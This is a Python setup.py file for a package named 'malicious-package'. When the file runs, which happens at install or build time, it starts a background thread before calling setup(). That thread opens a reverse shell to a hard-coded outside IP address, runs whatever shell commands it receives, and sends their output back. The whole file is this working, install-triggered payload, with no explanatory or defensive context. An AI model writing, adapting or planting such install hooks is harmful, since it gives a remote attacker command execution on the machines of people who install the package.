from setuptools import setup
import socket
import subprocess
import os
import threading
import time

def reverse_shell():
    try:
        # Your VPS IP
        ATTACKER_IP = "142.93.23.15"
        ATTACKER_PORT = 80
        
        # Connect to VPS
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        
        # Send initial connection message
        s.send(b"\n[+] REVERSE SHELL CONNECTED\n")
        s.send(b"[+] Type commands and press Enter\n")
        s.send(b"[+] Output will appear below\n")
        s.send(b"-" * 50 + b"\n")
        
        while True:
            # Wait for command
            s.send(b"\n$ ")
            cmd = s.recv(1024).decode().strip()
            
            if cmd.lower() == 'exit':
                break
                
            if cmd:
                try:
                    # Run command and get output
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    # Send output back
                    output = result.stdout + result.stderr
                    if output:
                        s.send(output.encode())
                    else:
                        s.send(b"[+] Command executed (no output)\n")
                        
                except Exception as e:
                    s.send(f"Error: {str(e)}\n".encode())
        
        s.close()
        
    except Exception as e:
        # Log error to file
        with open("/tmp/revshell_debug.log", "w") as f:
            f.write(f"Error: {str(e)}")

# Start the shell
thread = threading.Thread(target=reverse_shell)
thread.daemon = True
thread.start()

# Give it time to connect
time.sleep(2)

setup(
    name="malicious-package",
    version="1.0.0",
)
